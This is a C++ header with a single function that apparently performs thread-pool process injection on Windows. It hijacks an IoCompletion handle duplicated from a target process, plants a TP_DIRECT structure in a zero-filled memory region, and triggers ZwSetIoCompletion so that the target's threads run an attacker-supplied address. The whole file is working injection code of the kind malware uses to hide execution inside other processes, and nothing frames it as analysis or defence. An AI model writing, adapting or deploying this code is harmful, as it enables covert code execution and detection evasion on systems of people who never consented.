#pragma once

#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <Psapi.h>
#include <memory>
#include <string_view>

#include "Ntdll.hpp"
#include "ThreadPool.hpp"
#include <map>

inline bool CreateTP(HANDLE process, void* address) {
    PROCESS_HANDLE_SNAPSHOT_INFORMATION* Handles = (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)(new BYTE[100000]);

    NTSTATUS status = NtF("NtQuerySystemInformation")(ProcessHandleInformation, Handles, 100000, nullptr);
    if (!NT_SUCCESS(status)) {
        printf("Failed to query process handle information, status 0x%X", status, "\n");
        return false;
    }

    std::unique_ptr<BYTE[]> typeInfoBuffer = std::make_unique<BYTE[]>(10000);
    OBJECT_TYPE_INFORMATION* typeInfo =
        reinterpret_cast<OBJECT_TYPE_INFORMATION*>(typeInfoBuffer.get());

    HANDLE completionHandle = nullptr;
    for (DWORD i = 0; i < Handles->NumberOfHandles; i++) {
        HANDLE duplicatedHandle = nullptr;
        if (DuplicateHandle(process, reinterpret_cast<HANDLE>(i),
            GetCurrentProcess(), &duplicatedHandle,
            0, FALSE, DUPLICATE_SAME_ACCESS)) {

            if (NT_SUCCESS(NtF("NtQueryObject")(duplicatedHandle, 2, typeInfo, 10000, nullptr)) &&
                wcscmp(L"IoCompletion", typeInfo->TypeName.Buffer) == 0) {
                completionHandle = duplicatedHandle;
                break;
            }
            else CloseHandle(duplicatedHandle);
        }
    }

    if (!completionHandle) {
        printf("Failed to find IoCompletion handle", "\n");
        return false;
    }

    MEMORY_BASIC_INFORMATION mbi;
    PTP_DIRECT remoteDirectAddress = nullptr;
    PBYTE searchAddress = nullptr;
    SIZE_T minCaveSize = sizeof(TP_DIRECT);

    while (VirtualQueryEx(process, searchAddress, &mbi, sizeof(mbi))) {
        searchAddress = (PBYTE)mbi.BaseAddress + mbi.RegionSize;

        if (mbi.State == MEM_COMMIT &&
            mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize >= minCaveSize) {

            BYTE buffer[4096];
            SIZE_T bytesRead;
            PBYTE regionAddress = (PBYTE)mbi.BaseAddress;

            for (SIZE_T offset = 0; offset <= mbi.RegionSize - minCaveSize; offset += sizeof(buffer)) {
                SIZE_T readSize = min(sizeof(buffer), mbi.RegionSize - offset - minCaveSize + 1);
                if (!ReadProcessMemory(process, regionAddress + offset, buffer, readSize, &bytesRead)) {
                    break;
                }

                for (SIZE_T i = 0; i <= bytesRead - minCaveSize; i++) {
                    bool isCave = true;
                    for (SIZE_T j = 0; j < minCaveSize; j++) {
                        if (buffer[i + j] != 0) {
                            isCave = false;
                            break;
                        }
                    }

                    if (isCave) {
                        remoteDirectAddress = (PTP_DIRECT)(regionAddress + offset + i);
                        break;
                    }
                }

                if (remoteDirectAddress) break;
            }
        }

        if (remoteDirectAddress) break;
    }

    if (!remoteDirectAddress) {
        printf("Failed to find suitable codecave in target process", "\n");
        CloseHandle(completionHandle);
        return false;
    }
    TP_DIRECT direct = { 0 };
    direct.Callback = static_cast<TP_DIRECT*>(address);
    if (!WriteProcessMemory(process, remoteDirectAddress, &direct,
        sizeof(TP_DIRECT), nullptr)) {
        printf("Failed to write TP_DIRECT structure to target process, error 0x%X", GetLastError(), "\n");
        CloseHandle(completionHandle);
        return false;
    }
    status = NtF("ZwSetIoCompletion")(completionHandle, remoteDirectAddress, 0, 0, 0);
    if (!NT_SUCCESS(status)) {
        printf("Failed to set IO completion, status 0x%X", status, "\n");
        CloseHandle(completionHandle);
        return false;
    }
    CloseHandle(completionHandle);
    return true;
}
